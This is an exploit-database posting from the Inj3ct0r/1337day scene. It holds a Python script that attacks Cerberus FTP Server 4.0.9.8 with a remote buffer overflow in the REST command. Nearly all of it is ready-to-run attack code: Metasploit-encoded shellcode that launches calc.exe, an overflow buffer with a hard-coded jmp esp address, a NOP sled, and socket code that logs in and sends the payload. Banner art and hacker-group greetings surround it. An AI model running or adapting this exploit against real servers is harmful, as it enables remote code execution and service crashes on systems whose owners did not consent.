1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : Cerberus FTP Server 4.0.9.8 (REST) Remote BOF and Crash Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30008) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com * sec4ever.com
# Facebook : http://facebook.com/KedAns
# platform : windows
# Impact : Remote Buffer Overflow ( in REST command)
# Tested on : Windows XP SP3 (en)
##

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * H-KinG |
# | ------------------------------------------------- < |
###

#=====[ Exploit Code ]======>

#!/usr/bin/python

# Cerberus FTP Server 4.0.9.8 (REST) Remote BOF and Crash Exploit
# Provided by : KedAns-Dz * Inj3ct0r Team

import errno
from os import strerror
from socket import *
import sys
from time import sleep
from struct import pack

if len(sys.argv) != 3:
    print "[*]Usage: python %s <ip> <port>" % sys.argv[0]
    print "[*]Exemple: python %s 192.168.1.2 21" % sys.argv[0]
    sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])

# windows/exec | cmd=calc.exe | x86/alpha_mixed (http://metasploit.com)
shellcode = ("\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48" 
"\x50\x68\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41" 
"\x51\x51\x44\x44\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58" 
"\x56\x6a\x30\x50\x50\x54\x55\x50\x50\x61\x33\x30\x31\x30" 
"\x38\x39\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" 
"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41" 
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42" 
"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x4b" 
"\x58\x4e\x69\x43\x30\x43\x30\x43\x30\x43\x50\x4f\x79\x4b" 
"\x55\x45\x61\x4e\x32\x43\x54\x4c\x4b\x42\x72\x50\x30\x4c" 
"\x4b\x42\x72\x44\x4c\x4e\x6b\x43\x62\x42\x34\x4c\x4b\x43" 
"\x42\x45\x78\x46\x6f\x4d\x67\x51\x5a\x51\x36\x50\x31\x49" 
"\x6f\x50\x31\x4b\x70\x4c\x6c\x45\x6c\x43\x51\x51\x6c\x47" 
"\x72\x46\x4c\x51\x30\x49\x51\x4a\x6f\x46\x6d\x47\x71\x4a" 
"\x67\x4a\x42\x4a\x50\x46\x32\x51\x47\x4c\x4b\x43\x62\x44" 
"\x50\x4e\x6b\x42\x62\x45\x6c\x47\x71\x4e\x30\x4c\x4b\x47" 
"\x30\x50\x78\x4e\x65\x49\x50\x50\x74\x51\x5a\x46\x61\x4e" 
"\x30\x50\x50\x4c\x4b\x51\x58\x45\x48\x4e\x6b\x43\x68\x45" 
"\x70\x47\x71\x4b\x63\x4a\x43\x45\x6c\x47\x39\x4c\x4b\x47" 
"\x44\x4c\x4b\x46\x61\x48\x56\x50\x31\x49\x6f\x46\x51\x4f" 
"\x30\x4e\x4c\x4b\x71\x4a\x6f\x44\x4d\x47\x71\x4a\x67\x44" 
"\x78\x49\x70\x44\x35\x48\x74\x45\x53\x51\x6d\x4a\x58\x45" 
"\x6b\x51\x6d\x44\x64\x44\x35\x48\x62\x51\x48\x4e\x6b\x51" 
"\x48\x47\x54\x43\x31\x4b\x63\x43\x56\x4e\x6b\x46\x6c\x42" 
"\x6b\x4c\x4b\x43\x68\x47\x6c\x46\x61\x4a\x73\x4e\x6b\x43" 
"\x34\x4e\x6b\x47\x71\x48\x50\x4c\x49\x51\x54\x51\x34\x45" 
"\x74\x43\x6b\x43\x6b\x50\x61\x46\x39\x51\x4a\x42\x71\x4b" 
"\x4f\x4d\x30\x50\x58\x51\x4f\x50\x5a\x4e\x6b\x46\x72\x4a" 
"\x4b\x4b\x36\x43\x6d\x51\x7a\x46\x61\x4e\x6d\x4f\x75\x4d" 
"\x69\x43\x30\x47\x70\x45\x50\x50\x50\x42\x48\x44\x71\x4c" 
"\x4b\x50\x6f\x4b\x37\x4b\x4f\x4a\x75\x4f\x4b\x4a\x50\x4d" 
"\x65\x4e\x42\x42\x76\x50\x68\x4e\x46\x4e\x75\x4f\x4d\x4d" 
"\x4d\x4b\x4f\x4e\x35\x47\x4c\x44\x46\x51\x6c\x44\x4a\x4d" 
"\x50\x49\x6b\x49\x70\x42\x55\x46\x65\x4f\x4b\x47\x37\x45" 
"\x43\x51\x62\x50\x6f\x42\x4a\x47\x70\x50\x53\x49\x6f\x49" 
"\x45\x50\x63\x51\x71\x42\x4c\x42\x43\x46\x4e\x50\x65\x51" 
"\x68\x43\x55\x45\x50\x41\x41")
buf = "\x41" * 244
buf += pack('<L',0x7C874413) # jmp esp - from (kernel32.dll)
buf += "\x90" * 50
buf += shellcode

print "[+]Connecting with server..."
sleep(1)
try:
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ip,port))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send("PASS test\r\n")
    s.recv(1024)
    s.send("REST "+buf+"\r\n")
    s.close()
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ip,port))# Connected again to Crash and BOF
    sleep(1)
    s.close()# Close connection and Crash!!!
    print "[+]Exploit sent with sucess"
except:
	print "[-]Error in connection with server: "+ip

#=====[ The End ]=======|

#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]=====================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > + Rizky Ariestiyansyah * Islam Caddy <3
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re * CrosS (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * SeeMe * XroGuE * ZoRLu * gunslinger_ 
# anT!-Tr0J4n * ^Xecuti0N3r * Kalashinkov3 (www.1337day.com/team) * Dz Offenders Cr3w * Sec4ever
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X
# Kha&miX * Str0ke * JF * Ev!LsCr!pT_Dz * H-KinG * www.packetstormsecurity.org * TreX (hotturks.org)
# www.metasploit.com * UE-Team & I-BackTrack * r00tw0rm.com * All Security and Exploits Webs ..
#=================================================